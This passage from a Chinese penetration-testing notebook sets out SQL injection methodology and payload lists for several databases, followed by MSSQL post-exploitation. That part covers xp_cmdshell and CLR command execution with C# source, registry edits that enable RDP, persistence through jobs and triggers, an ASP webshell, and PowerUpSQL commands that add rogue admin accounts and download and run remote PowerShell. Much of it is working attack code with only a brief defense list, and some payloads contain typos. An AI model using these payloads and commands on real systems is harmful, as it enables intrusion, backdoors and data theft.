<pre><code>往upload等其他目录上传，不要往根目录上传即可
</code></pre>
<p>3）secure_file_priv的值为空或者指定了某个目录，但是上传后的文件为空，没有内容写进去</p>
<pre><code>https://zhuanlan.zhihu.com/p/58007573

或者手动写入

https://xz.aliyun.com/t/7416
</code></pre>
<hr>
<p><strong>–os-shell MSSQL</strong></p>
<pre><code>输入：
os-shell&gt; for /r C: %i in (*xxx*) do @echo %i
</code></pre>
<pre><code>https://xz.aliyun.com/t/7942
</code></pre>
<hr>
<p><strong>导入导出</strong></p>
<p><strong>#SELECT INTO OUTFILE  导入，写入文件</strong></p>
<pre><code>https://ivanzz1001.github.io/records/post/database/2018/10/19/mysql-basis_part18
</code></pre>
<p><strong>#load_file 导出,读取文件</strong></p>
<pre><code>https://www.xcnte.com/archives/512/
</code></pre>
<p>如果读取不出来，则将读取的内容写入到当前web目录里，后缀为txt，然后访问</p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200924095242429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考该思路…</p>
<p><img src="https://img-blog.csdnimg.cn/20200924095023221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>总结</strong></p>
<pre><code>%5c，%bf'，单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入!!! 

注意：（-- ）一定要在注释符号后加空格，或者URL编码后的空格（%20），否则注释符号不会产生作用 

			注释符#  --+交替用，一个不行，就另一个 

1）先判断是数字型还是字符型，如果判断不出来跳到9 

2）接着判断有没有括号 

3）最后面跟上--+注释符 

4）order by判断字段数，如果没法判断，则直接union select 1,2,3一个个测试过去

5）如果返回的页面发生变化，则联合查询

6）如果union select 1,version(),3返回的页面没有发生变化，即联合查询失败，则尝试报错注入 

7）如果报错注入页面也没有把信息显示出来，则进行延时注入 

8）如果延时注入也不行，则导入导出 

9）尝试延时注入，如果从1过来的，则三种情况，直接跟payload，参数后面加单引号或者双引号
</code></pre>
<hr>
<p><strong>Payload</strong></p>
<p>数字型：–+或者#</p>
<pre><code>or 1=1

or 1=1 --+

)or 1=1--+

/***/or/***/2/***/like/***/1-- 		用/***/替换空格，用like替换=		具体案例看漏洞
</code></pre>
<p>字符型：–+或者#</p>
<pre><code>' or '1'='1

' or 1=1 --+

' ) or 1=1 --+ 

‘))or 1=1 --+



" or "1"="1 

" or 1=1 --+ 

") or 1=1 --+ 

"))or 1=1 --+
</code></pre>
<p>其他函数：</p>
<pre><code>or rpad('',1, user())和or Ipad('',1,user())="r" 
</code></pre>
<p>伪静态：使用%5c，%5c是\的url编码</p>
<pre><code>http://url/Home/Orders/index/currency/%5c.html
</code></pre>
<hr>
<p>1）布尔</p>
<p>2）延时，如果过了5秒才显示页面，则存在注入</p>
<p>mysql：BENCHMARK (100000,MD5 (1)) or sleep(5)</p>
<pre><code>id=1' and sleep( if( (select length(database()) &gt;0) , 5, 0 ) )%23 

id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 

id=1' or sleep(ord(substr(password,1,1))) -- 

id=1' XOR(sleep(if((select length(database()) &gt;6),0,5)))XOR'Z 

id=1' and (SELECT 1 FROM (SELECT(SLEEP(5)))Gbqj) --+ 

id=1'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))ibEg)/** 

Referer:1'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

ua:'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z 

x-forw:'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
</code></pre>
<p>mssql：</p>
<pre><code>id=1' WAITFOR DELAY '0:0:5'--+ 

id=1';WAITFOR DELAY '0:0:5'--+ 

id=1');WAITFOR DELAY '0:0:5'--+ 



id=1" WAITFOR DELAY '0:0:5'--+ 

id=1";WAITFOR DELAY '0:0:5'--+ 

id=1");WAITFOR DELAY '0:0:5'--+ 



id=1' or 51 = '49'; WAITFOR DELAY '0:0:5'--+
</code></pre>
<p>只是常见的，可以继续枚举…</p>
<p>#报错注入，爆数据库版本</p>
<p>以下payload都是数字型，如果是字符型，就在1后面添加单引号或者双引号</p>
<pre><code>id=1+and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+ 

id=1+and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+ 

id=1+and geometrycollection((select * from(select * from(select user())a)b))--+ 

id=1+and multipoint((select from(select * from(select user())a)b))--+ 

in d=1+and polygon((select * from(select *  from(select user()a)b))--+ 

id=1+and multipolygon((select * from(select *  from(select user())a)b))--+ 

id=1+and linestring((select * from(select * from(select user())a)b))--+ 

id=1+and multilinestring((select * from(select * from(select user()a)b))--+ 

1d=1+and exp(~(select * from(select user())a))--+ 

PostgreSQL：/?param=1 and(1)=cast(version() as numeric)--+
</code></pre>
<p>Oracle报错注入</p>
<pre><code>' AND 1932(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||(SELECT+(CASE+WHEN
</code></pre>
<pre><code>如果sq1map跑不出,则加参数 --level 5 --risk 3 

risk 

共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加0R语句的SQL注入测试
</code></pre>
<hr>
<h2><a id="22101_MSSQLdayuEighth_day_4435"></a>2.2.10.1 MSSQL利用总结（dayu-Eighth day）</h2>
<h2><a id="_4437"></a>命令执行</h2>
<p><strong>1、xp_cmdshell</strong></p>
<pre><code>开启xp_cmdshell

sp_configure 'show advanced options',1

reconfigure

go

sp_configure 'xp_cmdshell',1

reconfigure

go

执行

exec xp_cmdshell "whoami"

//在mssql中，转义符为"""转义字符"""

恢复被删除的xp_cmdshell

EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'

提示找不到xplog70.dll则需要自己上传。
</code></pre>
<p><strong>2、sp_oacreate</strong></p>
<p>打开组件</p>
<pre><code>EXEC sp_configure 'show advanced options', 1;   

RECONFIGURE WITH OVERRIDE;   

EXEC sp_configure 'Ole Automation Procedures', 1;   

RECONFIGURE WITH OVERRIDE;   

EXEC sp_configure 'show advanced options', 0;
</code></pre>
<p>执行</p>
<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'
</code></pre>
<p>此方法无回显，可把命令执行结果写到web路径下或者配合dns侧信道</p>
<hr>
<p><strong>3、沙盒执行</strong></p>
<pre><code>需要当前mssql用户有写注册表权限

开启

exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;

exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1

执行

select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
</code></pre>
<p>在默认安装mssql 2012上报错  “无法创建链接服务器“(null)”的 OLE DB 访问接口“microsoft.jet.oledb.4.0”的实例。”  暂未找到解决办法</p>
<hr>
<p><strong>4、CLR执行</strong></p>
<p>Common Language Runtime(CLR)程序集定义为可以导入SQL Server的.NET DLL（或DLL组）。导入后，DLL方法可以链接到存储过程并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本机功能的好方法，但自然也为攻击者创造了机会。以C#代码为例，将下面代码用CSC编译为dll</p>
<pre><code>using System;

using System.Data;

using System.Data.SqlClient;

using System.Data.SqlTypes;

using Microsoft.SqlServer.Server;

using System.IO;

using System.Diagnostics;

using System.Text;

   public partial class StoredProcedures

   {

       [Microsoft.SqlServer.Server.SqlProcedure]

       public static void cmd_exec (SqlString execCommand)

       {

           Process proc = new Process();

           proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";

           proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);

           proc.StartInfo.UseShellExecute = false;

           proc.StartInfo.RedirectStandardOutput = true;

           proc.Start();

           // Create the record and specify the metadata for the columns.

           SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

           // Mark the beginning of the result set.

           SqlContext.Pipe.SendResultsStart(record);

           // Set values for each column in the row

           record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

           // Send the row back to the client.

           SqlContext.Pipe.SendResultsRow(record);

           // Mark the end of the result set.

           SqlContext.Pipe.SendResultsEnd();

           proc.WaitForExit();

           proc.Close();

       }

   };
</code></pre>
<p>编译</p>
<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs //主意.net版本
</code></pre>
<p>得到的DLL上传到目标，设置dll文件权限，否则mssql可能因为文件权限问题导致读取dll失败</p>
<p>开启CLR</p>
<pre><code>sp_configure 'show advanced options',1

 RECONFIGURE

 GO

 -- Enable clr on the server

 sp_configure 'clr enabled',1

 RECONFIGURE

 GO
</code></pre>
<p>遇到权限问题，需要设置数据库拥有者为sa，这个方法不能使用master数据库来执行查询语句</p>
<pre><code> alter database [数据库名] set TRUSTWORTHY on

 EXEC sp_changedbowner 'sa'
</code></pre>
<p>接着执行</p>
<pre><code>-- Import the assembly

   CREATE ASSEMBLY my_assembly

   FROM 'c:\temp\cmd_exec.dll'

   WITH PERMISSION_SET = UNSAFE;

   Go

   -- Link the assembly to a stored procedure

   CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];

   GO
</code></pre>
<p>接下来就可以执行命令了<br>
<img src="https://img-blog.csdnimg.cn/20200924114354429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这个方法还可以通过16进制文件流的方式导入DLL，这样可以不用文件落地</p>
<hr>
<p><strong>5、com对象</strong></p>
<p>开启</p>
<pre><code>EXEC sp_configure 'Ole Automation Procedures',1
</code></pre>
<p>执行</p>
<pre><code> declare @dbapp int,@exec int,@text int,@str varchar(8000);

   exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@dbapp output;

   --exec sp_oamethod @dpapp,'run',null,'calc.exe';

   exec sp_oamethod @dbapp,'exec',@exec output,'C:\\windows\\system32\\cmd.exe /c whoami';

   exec sp_oamethod @exec, 'StdOut', @text out;

   exec sp_oamethod @text, 'readall', @str out

   select @str
</code></pre>
<hr>
<h2><a id="_4669"></a>注册表</h2>
<p><strong>1、读注册表</strong></p>
<pre><code>EXEC xp_regread 'HKEY_CURRENT_USER','Control Panel\International','sCountry'
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924114617666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、写注册表</strong></p>
<pre><code>master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0; #开启远程桌面
</code></pre>
<p><strong>3、删除操作</strong></p>
<pre><code>exec master.xp_regdeletevalue 'HKEY_LOCAL_MACHINE','

SOFTWARE/Microsoft/Windows/CurrentVersion','TestValueName' //删除值

exec

master.xp_regdeletekey 'HKEY_LOCAL_MACHINE','

SOFTWARE/Microsoft/Windows/CurrentVersion/Testkey'  //删除键
</code></pre>
<p><strong>4、添加值</strong></p>
<pre><code> EXECUTE master..xp_regaddmultistring

 @ rootkey ='HKEY_LOCAL_MACHINE'，

 @ key ='SOFTWARETest'，

 @ value_name ='TestValue'，

 @ value ='Test'
</code></pre>
<p><strong>5、枚举可用的注册表键</strong></p>
<pre><code>EXEC master..xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202009241148411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="_4716"></a>持久化</h2>
<p><strong>1、定时任务</strong></p>
<p>启用sql server代理，右键-新建-作业<br>
<img src="https://img-blog.csdnimg.cn/20200924114939776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
步骤-新建<br>
<img src="https://img-blog.csdnimg.cn/20200924114955279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
配置执行的语句，可以自定义<br>
<img src="https://img-blog.csdnimg.cn/20200924115056180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="配置执行的语句，可以自定义"><br>
然后在“计划”选项里配置执行时间<br>
<img src="https://img-blog.csdnimg.cn/20200924115108160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此外，可以使用十六进制CLR新建一个存储过程然后用计划作业执行存储过程，这样更加隐蔽</p>
<p><strong>2、触发器</strong></p>
<p>触发器用于在执行指定语句动作之后执行sql语句，如update,可配合注入使用</p>
<pre><code>SET ANSI_NULLS ON

 GO

 SET QUOTED_IDENTIFIER ON

 GO                             

 CREATE TRIGGER [test222]

      ON [test]

      AFTER UPDATE           /*建立一个作用于表test的、

                                            类型为After update的、名为                                               test222的触发器*/

 AS 

 BEGIN

              EXECUTE MASTER.DBO.XP_CMDSHELL 'cmd.exe /c calc.exe'

 END

 GO
</code></pre>
<p>在对表进行update操作之后，就会执xp_cmdshell</p>
<hr>
<h2><a id="_4767"></a>文件操作</h2>
<p><strong>1、判断文件是否存在</strong></p>
<pre><code>exec xp_fileexist "C:\\users\\public\\test.txt"
</code></pre>
<p>返回0表示文件不存在，1表示存在。在执行无回显命令时，把执行结果重定向到一个文件，再用xp_fileexist判断该文件是否存在，就可知道命令是否执行成功</p>
<p><strong>2、列目录</strong></p>
<pre><code>exec xp_subdirs "C:\Users\Administrator\",2,1
</code></pre>
<p>第一个参数设定要查看的文件夹。 第二个参数限制了这个存储过程将会进行的递归级数。默认是零或所有级别。第三个参数告诉存储过程包括文件。默认是零或只对文件夹，数值 1 代表包括结果集的文件</p>
<p><img src="https://img-blog.csdnimg.cn/20200924115323977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、写文件</strong></p>
<pre><code>exec sp_makewebtask 'c:\www\testwr.asp','select''&lt;%execute(request("SB"))%&gt;'' '

需要开启Web Assistant Procedures

exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE

在sql server 2012上开启失败
</code></pre>
<p><strong>4、创建目录</strong></p>
<pre><code>exec xp_create_subdir 'D:\test'
</code></pre>
<p><strong>5、压缩文件</strong></p>
<pre><code>exec xp_makecab 'c:test.cab', 'mszip', 1, 'c:test.txt' , 'c:test1.txt'
</code></pre>
<p>它允许你指定一列你想压缩的文件还有你想放进去的 cab 文件。它甚至允许你选择默认压缩， MSZIP 压缩 ( 类似于 .zip文件格式 ) 或不压缩。第一个参数给出到 cab 文件的路径，这是你想创建和添加文件的地方。第二个参数是压缩级别。如果你想使用详细的日志记录就使用第三个参数。第四个参数后跟着你想压缩的文件的名称。可以在扩展存储过程里传 多个要压缩的文件名称</p>
<hr>
<h2><a id="_4812"></a>信息获取</h2>
<p><strong>1、获取机器名</strong></p>
<pre><code>exec xp_getnetname
</code></pre>
<p><strong>2、获取系统信息</strong></p>
<pre><code>exec xp_msver
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924115517832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、获取驱动器信息</strong></p>
<pre><code>exec xp_fixeddrives
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924115549932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>4、获取域名</strong></p>
<pre><code>SELECT DEFAULT_DOMAIN() as mydomain;
</code></pre>
<p><strong>5、遍历域用户</strong></p>
<p>先获取RID</p>
<pre><code>SELECT SUSER_SID('CATE4CAFE\Domain Admins')
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924115639783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
利用RID前48位即0x010500000000000515000000F80F57B63AF32D50A0916B7B构造SID即可遍历域用户。我们知道，域用户的SID是从500开始，所以把500转换成16进制，为01F4，在mssql里需要翻转为F401，然后用0000补足得到0x010500000000000515000000F80F57B63AF32D50A0916B7BF4010000，在mssql里查询</p>
<p><img src="https://img-blog.csdnimg.cn/20200924115714319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
采用循环SQL语句遍历即可遍历出所有域用户<br>
<img src="https://img-blog.csdnimg.cn/20200924115735346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
msf有个模块可通过注入点枚举域用户<br>
<img src="https://img-blog.csdnimg.cn/20200924115757680.png#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code>https://cloud.tencent.com/developer/article/1506821   --感谢雷神众测大佬的分享
</code></pre>
<hr>
<h2><a id="22102_MSSQLPowerUpSQL__4860"></a>2.2.10.2 攻击MSSQL–PowerUpSQL 介绍</h2>
<h2><a id="MSSQL_4861"></a>发现MSSQL实例</h2>
<p>发现本地实例<br>
<img src="https://img-blog.csdnimg.cn/20200924133858389.png#pic_center" alt="在这里插入图片描述"><br>
通过SPN查找域内mssql实例<br>
<img src="https://img-blog.csdnimg.cn/20200924133924972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过广播查找mssql实例<br>
<img src="https://img-blog.csdnimg.cn/20200924133940680.png#pic_center" alt="在这里插入图片描述"><br>
通过UDP查找网络内的mssql实例<br>
<img src="https://img-blog.csdnimg.cn/20200924133953892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
接受机器名或者IP</p>
<hr>
<h2><a id="MSSQL_4874"></a>获取MSSQL信息</h2>
<p>获取配置信息<img src="https://img-blog.csdnimg.cn/20200924134029611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
获取服务信息<br>
<img src="https://img-blog.csdnimg.cn/20200924134044724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="_4878"></a>测试口令</h2>
<p>获取默认密码实例</p>
<p>在脚本中提供了默认安装的一些实例名和默认密码，但是不包括MSSQLSERVER和SQL Express（避免账号锁定）。可以根据自身需要加入自定义的账号密码</p>
<p><img src="https://img-blog.csdnimg.cn/20200924134120613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
使用字典测试<img src="https://img-blog.csdnimg.cn/20200924134131130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令的含义是通过管道爆破可以连接的发现的实例。此外，该函数还可以尝试通过Invoke-SQLOSCmd执行命令<img src="https://img-blog.csdnimg.cn/202009241341479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="_4886"></a>持久性</h2>
<p><strong>启用存储过程</strong></p>
<pre><code>在SQL Server启动时添加数据库管理账户

Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -NewSqlUser EvilSysadmin1 -NewSqlPass Password123!

添加windows管理员

Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -NewosUser Evilosadmin1 -NewosPass Password123!

执行 powershell命令

Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.xxxxxxusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
</code></pre>
<p><strong>写注册表</strong></p>
<pre><code>Get-SQLPersistRegDebugger -Verbose -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Instance "MSSQL" -Username "sa" -Password "_PL&lt;0okm"

RDP后门，需要当前mssql用户有写注册表权限
</code></pre>
<p>作业<br>
<img src="https://img-blog.csdnimg.cn/20200924134322237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
除了CMD，还支持VBScript、powershell、JScript<br>
<img src="https://img-blog.csdnimg.cn/20200924134334739.png#pic_center" alt="在这里插入图片描述"><br>
此外，工具还集成了一些通过mssql执行系统命令的方式</p>
<pre><code>Invoke-SQLOSCmd

Invoke-SQLOSCmdCLR

Invoke-SQLOSCmdCOle

Invoke-SQLOSCmdPython       

Invoke-SQLOSCmdR
</code></pre>
<p>触发器</p>
<pre><code>工具支持创建DDL和DML两种触发器

Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014 -username '' -password ''

Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -username '' -password ''

可根据实际情况定义触发条件
</code></pre>
<h2><a id="_4938"></a>获取域信息</h2>
<p>当前域用户信息</p>
<p><img src="https://img-blog.csdnimg.cn/20200924134437290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
域用户<img src="https://img-blog.csdnimg.cn/20200924134446910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
组<br>
<img src="https://img-blog.csdnimg.cn/20200924134457946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
域机器<br>
<img src="https://img-blog.csdnimg.cn/2020092413450974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
更多用法可自行查看命令参数，或者查看项目wiki</p>
<h2><a id="_4948"></a>防御方案</h2>
<pre><code>增加账号的口令强度
用低权限账号连接数据库
修改默认实例的默认口令
</code></pre>
<hr>
<h2><a id="22103_Mysql_4956"></a>2.2.10.3 如何利用Mysql安全特性发现漏洞</h2>
<p><strong>前言</strong><br>
在渗透测试时，面对Mysql环境，需要用到load_file与into outfile时，会发现无法使用load_file读取不到系统文件、同时into outfilet无法写入后门进行getshell，这时候就有必要了解下Mysql数据库特性secure_file_priv变量安全配置。此变量用于限制数据导入和导出操作，执行的效果 LOAD DATA和SELECT… NTO OUTFILE报表和LOAD_FILE()功能。仅允许具有此FILE权限的用户执行这些操作</p>
<p>**</p>
<h2><a id="Mysql_4962"></a>Mysql权限</h2>
<p>**</p>
<p>1、管理权限使用户能够管理MySQL服务器的操作。这些权限是全局的，因为它们不是特定于特定数据库的</p>
<p>2、数据库权限适用于数据库及其中的所有对象。可以为特定数据库或全局授予这些权限，以便它们适用于所有数据库</p>
<p>3、可以为数据库中的特定对象，数据库中给定类型的所有对象（例如，数据库中的所有表）或全局的所有对象授予数据库对象（如表，索引，视图和存储例程）的权限。所有数据库中给定类型的对象</p>
<p>**</p>
<h2><a id="load_file_4975"></a>load_file函数用法</h2>
<p>本次提到的内容涉及的是GRANT和REVOKE的允许静态权限中的file在渗透测试过程中，碰到 load_file读取文件的前提条件：</p>
<p>MySQL LOAD_FILE（）读取文件并以字符串形式返回文件内容。</p>
<p>LOAD FILE（file name）</p>
<p>其中file_name是带路径的文件名。</p>
<p><img src="https://img-blog.csdnimg.cn/20200924135947437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
实例：</p>
<pre><code>SELECT * LOAD_FILE ('/home/username/myfile.txt')
</code></pre>
<p>要成功使用load_file读取文件有几个前提：</p>
<p>1）尝试加载的文件必须存在于运行MySQL服务器的同一主机中</p>
<p>2）加载文件必须指定文件的完整路径名</p>
<p>3）正在执行该命令的用户必须具有FILE权限</p>
<p>4）加载的文件不得超过 max_allowed packet变量指定的值</p>
<p>5）MySQL有一个secure_file_priv变量。如果该变量的值设置为非空目录名，则要加载的文件必须位于该目录中</p>
<h2><a id="Mysql_5004"></a>Mysql版本差异</h2>
<p>5.5.53之前版本，默认情况下此变量为空，允许使用mysql终端对secure_file_priv参数更新（不讨论windows环境安装情况）</p>
<p>5.5.53及之后版本修改secure_file_priv值只能修改my.cnf配置文件（不讨论windows环境安装）</p>
<h2><a id="_5009"></a>成功利用实例</h2>
<p><strong>案例</strong></p>
<p><strong>环境：</strong></p>
<pre><code>MySQL5.5版本 

RedHat6.2版本
</code></pre>
<p>仅能使用navicat连接数据库（非root权限用户）：</p>
<p>目标：</p>
<p>使用locd_file读取服务器文件、读取站点配置文件、站点源码，进一步getshell</p>
<pre><code>show global variables like '%secure%';
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924143827847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>secure_file_priv的值为null，那么secure_file_priv这里都有什么设置呢</p>
<p>secure_file_priv为null表示不允许导入导出</p>
<p>secure_file_priv指定文件夹时表示mysql的导入导出只能发生在指定的文件夹</p>
